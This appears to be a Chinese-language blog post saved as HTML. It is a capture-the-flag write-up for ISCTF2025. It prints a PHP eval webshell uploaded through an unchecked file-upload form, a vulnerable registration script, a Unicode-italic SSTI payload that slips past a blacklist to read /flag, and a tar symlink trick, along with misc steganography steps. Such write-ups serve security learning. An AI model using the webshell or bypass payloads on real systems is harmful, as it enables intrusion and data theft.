@@ -1,0 +1,670 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sport lin">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Webb@by n0t1ce b0ard打开靶机进入注册界面发现可以进行文件上传，因此存在文件上传漏洞。构造一句话木马 123&lt;?php @eval($_POST[&#x27;admin&#x27;]); ?&gt; 随意输入账号密码，并上传我们的木马，页面提示注册成功并返回一句警告由于比赛有提供网页后端代码，因此打开registration.php直接获取上传文件存储路径，即images&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISCTF2025">
+<meta property="og:url" content="https://linsport.github.io/2025/12/02/ctf/ISCTF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Webb@by n0t1ce b0ard打开靶机进入注册界面发现可以进行文件上传，因此存在文件上传漏洞。构造一句话木马 123&lt;?php @eval($_POST[&#x27;admin&#x27;]); ?&gt; 随意输入账号密码，并上传我们的木马，页面提示注册成功并返回一句警告由于比赛有提供网页后端代码，因此打开registration.php直接获取上传文件存储路径，即images&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/web1-1.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/web1-2.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/web1-3.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/web2-1.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/web3-1.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/web3-2.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/misc1-1.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/misc1-2.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/misc1-3.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/misc1-4.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/misc1-5.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/misc1-6.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/misc1-7.png">
+<meta property="og:image" content="https://linsport.github.io/img/ctf/ISCTF2025/misc2-1.png">
+<meta property="article:published_time" content="2025-12-02T11:44:35.710Z">
+<meta property="article:modified_time" content="2025-12-06T07:22:46.233Z">
+<meta property="article:author" content="sport lin">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://linsport.github.io/img/ctf/ISCTF2025/web1-1.png">
+  
+  
+  
+  <title>ISCTF2025 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBG.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"linsport.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Hello, World!</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/theme%20picture/1.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ISCTF2025"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-02 19:44" pubdate>
+          2025年12月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          735 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          7 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ISCTF2025</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="b-by-n0t1ce-b0ard"><a href="#b-by-n0t1ce-b0ard" class="headerlink" title="b@by n0t1ce b0ard"></a>b@by n0t1ce b0ard</h2><p>打开靶机进入注册界面<br><img src="/img/ctf/ISCTF2025/web1-1.png" srcset="/img/loading.gif" lazyload alt="界面"><br>发现可以进行文件上传，因此存在文件上传漏洞。<br><strong>构造一句话木马</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>随意输入账号密码，并上传我们的木马，页面提示注册成功并返回一句警告<br><img src="/img/ctf/ISCTF2025/web1-2.png" srcset="/img/loading.gif" lazyload alt="界面"><br>由于比赛有提供网页后端代码，因此打开<code>registration.php</code>直接获取上传文件存储路径，即<code>images/注册所用邮箱/所上传文件名</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;connection.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$save</span>))<br>&#123;<br><span class="hljs-comment">//check user alereay exists or not</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select * from user where email=&#x27;<span class="hljs-subst">$e</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$r</span>=<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span>==<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-variable">$err</span>= <span class="hljs-string">&quot;&lt;font color=&#x27;red&#x27;&gt;This user already exists&lt;/font&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//dob</span><br><span class="hljs-variable">$dob</span>=<span class="hljs-variable">$yy</span>.<span class="hljs-string">&quot;-&quot;</span>.<span class="hljs-variable">$mm</span>.<span class="hljs-string">&quot;-&quot;</span>.<span class="hljs-variable">$dd</span>;<br><span class="hljs-comment">//hobbies</span><br><span class="hljs-variable">$hob</span>=<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$hob</span>);<br><span class="hljs-comment">//image</span><br><span class="hljs-variable">$imageName</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;img&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-comment">//encrypt your password</span><br><span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$p</span>);<br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;insert into user values(&#x27;&#x27;,&#x27;<span class="hljs-subst">$n</span>&#x27;,&#x27;<span class="hljs-subst">$e</span>&#x27;,&#x27;<span class="hljs-subst">$pass</span>&#x27;,&#x27;<span class="hljs-subst">$mob</span>&#x27;,&#x27;<span class="hljs-subst">$gen</span>&#x27;,&#x27;<span class="hljs-subst">$hob</span>&#x27;,&#x27;<span class="hljs-subst">$imageName</span>&#x27;,&#x27;<span class="hljs-subst">$dob</span>&#x27;,now())&quot;</span>;<br><span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//upload image</span><br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;images/<span class="hljs-subst">$e</span>&quot;</span>);<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;img&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-string">&quot;images/<span class="hljs-subst">$e</span>/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;img&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$err</span>=<span class="hljs-string">&quot;&lt;font color=&#x27;blue&#x27;&gt;Registration successfull !!&lt;/font&gt;&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>利用中国蚁剑进行链接，成功获取flag<br><img src="/img/ctf/ISCTF2025/web1-3.png" srcset="/img/loading.gif" lazyload alt="flag"></p>
+<h2 id="难过的bottle"><a href="#难过的bottle" class="headerlink" title="难过的bottle"></a>难过的bottle</h2><p>查看后端代码，发现黑名单限制，由于是bottle模型，因此利用斜体字构造stti绕过</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># hint: flag is in /flag</span><br><br>UPLOAD_DIR = <span class="hljs-string">&#x27;uploads&#x27;</span><br>os.makedirs(UPLOAD_DIR, exist_ok=<span class="hljs-literal">True</span>)<br>MAX_FILE_SIZE = <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>  <span class="hljs-comment"># 1MB</span><br><br>BLACKLIST = [<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;h&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;j&quot;</span>,<span class="hljs-string">&quot;k&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>,<span class="hljs-string">&quot;o&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;v&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">contains_blacklist</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;检查内容是否包含黑名单中的关键词（不区分大小写）&quot;&quot;&quot;</span><br>    content = content.lower()<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(black_word <span class="hljs-keyword">in</span> content <span class="hljs-keyword">for</span> black_word <span class="hljs-keyword">in</span> BLACKLIST)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_extract_zip</span>(<span class="hljs-params">zip_path, extract_dir</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;安全解压ZIP文件（防止路径遍历攻击）&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zf:<br>        <span class="hljs-keyword">for</span> member <span class="hljs-keyword">in</span> zf.infolist():<br>            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> member_path.startswith(os.path.realpath(extract_dir)):<br>                <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;非法文件路径: 路径遍历攻击检测&quot;</span>)<br>            <br>            zf.extract(member, extract_dir)<br></code></pre></td></tr></table></figure>
+<p>创建文本文本档输入<code>&#123;&#123;𝑜𝑝𝑒𝑛('/flag').𝑟𝑒𝑎𝑑()&#125;&#125;</code>保存后压缩成zip上传，查看，成功获取flag<br><img src="/img/ctf/ISCTF2025/web2-1.png" srcset="/img/loading.gif" lazyload alt="flag"></p>
+<h2 id="flag？我就借走了"><a href="#flag？我就借走了" class="headerlink" title="flag？我就借走了"></a>flag？我就借走了</h2><p>利用软连接创建tar上传<br><img src="/img/ctf/ISCTF2025/web3-1.png" srcset="/img/loading.gif" lazyload alt="软连接"><br>成功上传，查看flag<br><img src="/img/ctf/ISCTF2025/web3-2.png" srcset="/img/loading.gif" lazyload alt="flag"></p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="阿利维亚的传说"><a href="#阿利维亚的传说" class="headerlink" title="阿利维亚的传说"></a>阿利维亚的传说</h2><p>下载附件，修改后缀为zip解压，打开第一个word文档，检查发现存在隐藏文字<br><img src="/img/ctf/ISCTF2025/misc1-1.png" srcset="/img/loading.gif" lazyload alt="检查"><br>利用<code>ctrl+A</code>选中全文档，在字体中关闭隐藏，出现谕言1<br><img src="/img/ctf/ISCTF2025/misc1-2.png" srcset="/img/loading.gif" lazyload alt="谕言1"><br>利用stegsolve查看附件中的图片，发现异常片段<br><img src="/img/ctf/ISCTF2025/misc1-3.png" srcset="/img/loading.gif" lazyload alt="片段"><br>将其base64解码后得到谕言2<br><img src="/img/ctf/ISCTF2025/misc1-4.png" srcset="/img/loading.gif" lazyload alt="谕言2"><br>利用010 Editor查看图片，发现末尾藏着一个压缩文件，其中包含flag3.txt<br><img src="/img/ctf/ISCTF2025/misc1-5.png" srcset="/img/loading.gif" lazyload alt="010"><br>将其提取后发现解压需要密码，利用工具爆破后得到密码<br><img src="/img/ctf/ISCTF2025/misc1-6.png" srcset="/img/loading.gif" lazyload alt="密码"><br>成功得到谕言3<br><img src="/img/ctf/ISCTF2025/misc1-7.png" srcset="/img/loading.gif" lazyload alt="谕言3"><br>将三则谕言组合起来，从上往下读得到flag</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">DoNotTrustTitan_HopeYouMakeTherightChoice_FindMyGiftForYou<br></code></pre></td></tr></table></figure>
+
+<h2 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h2><p>秒了<br><img src="/img/ctf/ISCTF2025/misc2-1.png" srcset="/img/loading.gif" lazyload alt="flag"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ISCTF2025</div>
+      <div>https://linsport.github.io/2025/12/02/ctf/ISCTF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sport lin</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/30/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" title="sql注入基础">
+                        <span class="hidden-mobile">sql注入基础</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
